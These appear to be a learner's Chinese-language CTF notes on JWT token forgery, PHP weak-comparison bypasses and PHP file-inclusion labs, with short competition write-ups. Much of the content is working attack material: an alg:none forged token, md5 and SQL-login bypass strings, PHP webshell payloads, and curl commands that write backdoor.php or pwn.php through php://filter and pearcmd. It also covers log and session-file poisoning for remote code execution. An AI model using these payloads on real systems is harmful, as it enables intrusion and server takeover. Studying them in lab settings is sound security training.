# json web token和session 
```text
header
一个json对象，Base64URL转成字符串后就是header
payload
也是一个json对象，Base64URL转成字符串后就是payload
有7个官方字段
iss (issuer)：签发人
exp (expiration time)：过期时间
sub (subject)：主题
aud (audience)：受众
nbf (Not Before)：生效时间
iat (Issued At)：签发时间
jti (JWT ID)：编号
签名
密钥把header.payload进行处理，得到的就是签名。
base64URL
Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。
解题思路
能够伪造token后，只能改payload里的。，比如
原: {"username":"alice","role":"user"}
改: {"username":"admin","role":"admin"}
```
## 解题思路  
### 1.让服务端不验证签名
步骤
1. header：alg 改成 none
2. payload：role 改成 admin（身份在 payload 里，只改 header 不会变管理员）
3. signature：删掉，只留最后一个 .（空签名）
### 2.弱密钥爆破  
用脚本  
### 3.公钥混淆  
先从 TLS/SSL 证书中提取公钥  
再用脚本  
# PHP函数安全的零碎知识点   
## 题目  
```test
1.敏感信息泄露
随便输入账号密码，发现都能登录。
浏览器应用程序看cookie。
eyJBRyI6IjY3N2JhZmZmMTI5Y2E0ZX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJGTCI6ImN0Zmh1YntmYWMwOWJlNjkifQ.7kG4C4P_ZzjgMIV55Sqf_tFg-xVw-i7_fYCF_bbjroo
把header和payload分别base64解码
header
{"AG":"677bafff129ca4e}","typ":"JWT","alg":"HS256"}
payload
{"username":"admin","password":"admin","FL":"ctfhub{fac09be69"}
拼接得flag
2.无签名
题目要求把guest改成admin。于是把payload更改后base64，因为不知道签名，于是伪造无签名token。
header改成{"typ":"JWT","alg":"none"}
发送，cookie ：token=token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
3.弱密钥
4.修改签名算法
```
```text
1.is_numeric()
1.带空格的
判断是否是数字或数字字符串
9001\u{A0}
不间断空格，在php各版本都判定为非数字
"42 "  " 42"
php8,前后挡空格均数字
php7，后挡非数字
2.
16进制，二进制只在非字符串时返回true
8进制，前面第一位是0，返回true
科学计数法，返回true
3.
想要绕过(不判断为数字)可以在数字前面或者后面加上%0a %0b %0c %0d %09
但在弱类型比较时会忽略前置加的
php精度
当小数位数足够多、逼近某个整数时，二进制表示和输出精度会让它显示/比较成那个整数。15 位左右是常见的"临界区"。
比较和类型转换漏洞
== :只比较值
=== :值和类型都比较
1.字符串当数字处理规则
1.起始部分是数字，就取这个数字的值。否则一律为0(起始位字符)
2.字符串包含e，E，.  ,就按float解析，否则就是int
3.intval截断，intval()直接截断后面的字符
100 == "1e2"      // true，"1e2" 是科学计数法 = 100
23333 == "0x5b25" // true，"0x5b25" 按十六进制解析 = 23333
intval（，$）
第二个参数为16，按16进制解析
按10，10进制解析
0，自己猜如何解析
PHP 8.0.0 之前：字符串与数字（或数字字符串）比较时，先把字符串转成数字再比，所以 0 == "a"、100 == "1e2" 等都能成立。
PHP 8.0.0 起：字符串与数字比较时，若字符串不是合法数字字符串，则按字符串比较，不再隐式转 0。这修复了大量弱比较绕过。
3.strcmp(str1, str2)
 
如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。在 php5.0 以前，strcmp 返回的是 str2 第一位字母转成 ascii 后减去 str1 第一位字母。
为使比较出错返回null，可传入一个数组
4.md5()
md5($ 字符串, $var2)
计算 字符串 的 MD5 散列值，如果 var2 为真将返回 16 字符长度的原始二进制格式
md5 在处理哈希字符串的时候，如果 md5 编码后的哈希值是 0e （科学计数法）开头的，都一律解释为 0，所以当两个不同的值经过哈希编码后他们的值都是以 0e 开头的，则每个值都是 0
ffifdyop
用来绕过md5($password, true)
前几位转ascll是   'or'6
拼接到sql绕过登录
记忆 0e碰撞
原理 MD5编码后哈希值都是0e开头，一律解释成0.
240610708
QLTHNDT
md5(240610708)==md5(QLTHNDT)
2.传入数组
传入一个数组的值，会报错，可能直接绕过判断了
。php 8.0.0行不通了
5.sha1()
参数不能位数组。否则返回null，两边如果返回都是null，则可以绕过===
5.$$
一个可变变量获得了一个普通变量的值并作为这个可变变量的变量名
$a = "A";
$$a = "B"
echo $a . "<br>"
echo $$a . "<br>";
echo $A . "<br>"
输出
A
B
B
5.strpos()
strpos(string $haystack, string $needle, int $offset = 0)
$haystack：要搜索的字符串（比如 $num）。
$needle：要查找的字符或字符串（比如 "0"）。
int $offset = 0从第0个开始找
找到了返回索引，否则返回flase
preg_match黑名单过滤
if (preg_match("/system|exec|passthru|flag/i", $cmd)) { die("No!"); }
遇到对应字符串直接终止脚本。
绕过不递归过滤，则可以双写绕过
str_replace / str_ireplace 的替换过滤
str_replace区分大小写
str_ireplace不区分大小写
$cmd = str_replace("flag", "", $cmd);
替换敏感词，不递归也可能双写绕过
弱类型比较过滤（==）
用 == 比较哈希或数值，导致特殊字符串被判定为相等。
```
#文件包含题目(PHPinclude-labs)  
```text
1.
1.直接读flag文本
?wrappers=file:///flag(file只能跟绝对路径)
2.执行php代码，再post传指令
?wrappers=backdoor.txt
post ctf=system('ls /');
2.
题目拼接了file://
记住后面只能跟绝对路径，源码写了flag的绝对路径
?wrappers=/flag
3.
题目拼接data://text/plain
?wrappers=,<?php system('cat /flag');?>
4.
过滤
?wrappers=,<?php echo`cat /fla?`;?>
5.远程包含
1.用本地的恶意文件
?wrappers=127.0.0.1/backdoor.txt
ctf=system('ls /');
2.让目标出网
6.php://filter
1.http://localhost:8083/?wrappers=filter/read=convert.base64-encode/resource=flag.php
结果为base64
2.http://localhost:8083/?wrappers=filter/read=convert.base64‑encode/resource=/flag
7.php://input
注意，post请求必须是原始的。只能用curl实现传post数据
curl传get，post数据
1.传get
1.curl "http://example.com/api?name=张三&age=20"
2.curl -G "http://example.com/api" -d "name=张三" -d "age=20"
相当于1.
2.传post
curl -X POST "http://example.com/login"  -d "username=admin"  -d "password=123456"
# body: username=admin&password=123456
3.get和post
curl -X POST "http://example.com/api?page=1"  -d "username=admin"  -d "password=123"
答案
 curl -X POST "http://localhost:8083?wrappers=1" -d '<?php echo $flag; ?>'
8.php://filter
读的时候用read，过滤发生在输出前，encode
写的时候用write，过滤发生在输入前，decode
?wrappers=filter/read=convert.base64-encode/resource=flag.php
?wrappers=filter/read=string.rot13/resource=flag.php
string.rot13 rot13变换
string.toupper 转大写字母
string.tolower 转小写字母
读源码时字符串过滤器（rot13/toupper/tolower/strip_tags）不行，不破坏执行性，只能用base64。
读文本都行
9.php://filter
?wrappers=filter/read=convert.base64-encode/resource=flag.php
10.过滤了读出的内容，不能有flag
read=convert.base64-encode
read=string.rot13
read=string.toupper

11.写入文件
恶意代码写入文件，post传body，再读文件，执行。
# 1. 写木马（Base64 躲 WAF，写链解码落盘）
curl -X POST "http://localhost:8083/?filename=php://filter/write=convert.base64-decode/resource=backdoor.php" \
     -d "data=PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGwnXSk7Pz4"

# 2. 访问 backdoor.php 执行命令读 flag
curl -X POST "http://localhost:8083/backdoor.php" -d "hell=system('cat /flag');"
body代表<?php eval($_POST['hell']); ?>
12.远程文件包含
13.日志投毒
找了一个内容可以控制的文件。
/var/log/nginx/access.log
/var/log/apache2/access.log
请求头投毒
/var/log/nginx/error.log
/var/log/apache2/error.log
报错投毒(可行性更低)
一般向一个不存在的路径发送请求，恶意代码写入user-gent
流程
先尝试读/etc/passwd
作为探针。
尝试读日志
/var/log/nginx/access.log
/var/log/apache2/access.log
发现可以，就User-Agent 里面填恶意代码
<?php system('cat /flag');?>
再次包含日志文件，就行了
14.就是把nginx换成了apache2
15.LFI_Session文件包含
例题
<?php
session_start();
$name = $_POST['name'];
if($name){
    $_SESSION["username"] = $name; // 将用户输入存入 Session
}
include($_GET['file']); // 文件包含漏洞点
?>
1.确定session文件路径
获取PHPSESSID
随便发一个post请求，应用程序，cookie里面获取PHPSESSID的值
2.向session文件写入恶意代码
post提交
name=<?php @eval($_POST['cmd']); ?>
3.文件包含
?file=/tmp/sess_(phpsessid的值)
post cmd=
本题
$_SESSION['username'] = 'HELLO CTF'; 

function hello_ctf($file){
if(preg_match("/file|http|ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect|log|\.|\:/i", $file)){
die("No Wrappers! No log! No suffix!");
}
include($file);
}

isset($_GET['file']) ? hello_ctf($_GET['file']) : '';
无法向session文件写入。
PHP 有个默认开启的特性：收到带文件的 multipart POST 且含 PHP_SESSION_UPLOAD_PROGRESS 字段时，它会把这个字段的值（你随便填）拼成键名写进该 Cookie 对应的 session 文件。
1. 正常访问页面 → 拿到 PHPSESSID（它 = 目标文件名）；
2. 带 Cookie 发 multipart POST：PHP_SESSION_UPLOAD_PROGRESS=<?php system('cat /flag');?> + 一个文件部分；
3. 发 ?file=/var/lib/sessions/sess_<PHPSESSID> 包含它；
4. 步骤 2、3 同时死循环，直到某次包含恰好落在 payload 存活的那几毫秒里 → flag 输出在返回页中。
18.绕过 require/include_once
思路，
/proc/self/root相当于/，但有解析成本。反复使用25次，可能可以绕过。
/proc/self/cwd相当于当前目录
/proc/self/root/proc/self/cwd就相当于回到当前目录了
再读文件flag.php

20.pearcmd
curl -X POST \
  "http://localhost:8083/?+config-create+/<?=system('cat</flag');?>+/var/www/html/pwn.php" \
  --data "file=%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd%2Ephp"
system()可以改
再访问http://localhost:8083/pwn.php
peclcmd
curl -X POST \
  "http://localhost:8083/?+config-create+/<?=system('cat</flag');?>+/var/www/html/pwn2.php" \
  --data "file=%2Fusr%2Flocal%2Flib%2Fphp%2Fpeclcmd%2Ephp"

# 触发
curl "http://localhost:8083/pwn2.php"
proc


获取首页所有链接
curl -s "http://target/" -o site.html
grep -oE '(href|src)="[^"]+"' site.html | sort -u
```
3. 实战题:【pkwctf2026】小虎鲸的文档库
先获取所有链接
获取首页所有链接
curl -s "http://target/" -o site.html
grep -oE '(href|src)="[^"]+"' site.html | sort -u
感觉/docs.php很像文件包含
<img width="962" height="355" alt="image" src="https://github.com/user-attachments/assets/9e00bd59-fcae-4579-9727-5a7f24c0756d" />
点击发现文件名应该是file
先尝试php://input,data://均不行
于是尝试日志包含
<img width="808" height="283" alt="image" src="https://github.com/user-attachments/assets/f89b4688-9e87-4aff-a124-2e9e5b7d0b5b" />
发现可以,于是再user-agent注入恶意代码，访问即可得到flag
4.极客大挑战2026保卫玉米
<img width="1262" height="580" alt="image" src="https://github.com/user-attachments/assets/1299fbde-1c92-46d7-8097-f77beb4e6d2f" />
<img width="1252" height="630" alt="image" src="https://github.com/user-attachments/assets/9951034f-1120-42af-b199-e25bbaadd073" />
<img width="1277" height="638" alt="image" src="https://github.com/user-attachments/assets/4e23c95e-da77-4a73-ae14-e2074af80879" />
这一步到知识盲区了
```
BASE="http://8080-2a99fd2c-df7d-4074-8be7-617e24b742eb.challenge.ctfplus.cn"
UA="Corn Terminal"

rm -f cj.txt

 1) 登记厨师 cornguard
curl -sS -c cj.txt -b cj.txt -L "$BASE/?name=cornguard" -o /dev/null

 2) 回执 action=join
curl -sS -c cj.txt -b cj.txt -X POST -d 'action=join' "$BASE/join" -o /dev/null

 3) 伪装厨房终端，进入 game 阶段
curl -sS -c cj.txt -b cj.txt -A "$UA" -L "$BASE/terminal" -o /dev/null

 确认 cookie 已写入：应看到一行 session=...
cat cj.txt

 4) 开战
curl -sS -b cj.txt -c cj.txt -A "$UA" -X POST "$BASE/api/start"; echo

 5) 三发超模伤害
for i in 1 2 3; do
  curl -sS -b cj.txt -c cj.txt -A "$UA" -X POST \
    -H 'Content-Type: application/json' -d '{"damage":99999}' "$BASE/api/fire"; echo
done
```
靠ai给的代码拿到了flag  
对这个流程还不是很了解  

5.极客大挑战2026ezphp  
第一部分要求不是数组，悉数比较不等于411413.  
必须有0，且不能在第一个。核心，根据==和intval的差异  
==默认识别为10进制，而intval（，0）代表自动识别  
?num=%2001443425这个八进制即可符合要求  
第二部分就是个死亡绕过  






